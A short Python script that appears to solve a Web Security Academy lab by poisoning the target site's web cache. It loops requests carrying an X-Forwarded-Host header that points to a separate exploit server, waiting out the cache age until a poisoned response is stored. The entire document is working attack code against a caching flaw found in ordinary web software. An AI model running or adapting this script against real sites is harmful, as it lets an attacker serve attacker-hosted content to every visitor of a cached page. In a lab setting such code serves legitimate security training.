import requests
import time

site = '0a75006c04216cd880770384008e0062.web-security-academy.net'
exploit_site = 'exploit-0a9200e104b76c32802a026401af002f.exploit-server.net'

s = requests.Session()
site_url = f'https://{site}/'

# Poison with X-Forwarded-Host pointing to our exploit domain
request_headers = {
    'X-Forwarded-Host': exploit_site
}

while True:
    resp = s.get(site_url, headers=request_headers)
    cache_status = resp.headers.get('X-Cache', 'N/A')
    age = int(resp.headers.get('Age', '0'))
    
    if cache_status == 'miss':
        print(f'[+] Cache miss - poisoned! Headers:\n{resp.headers}')
        break
    else:
        timeleft = 30 - age
        print(f'Waiting {timeleft}s for cache to expire...')
        time.sleep(timeleft)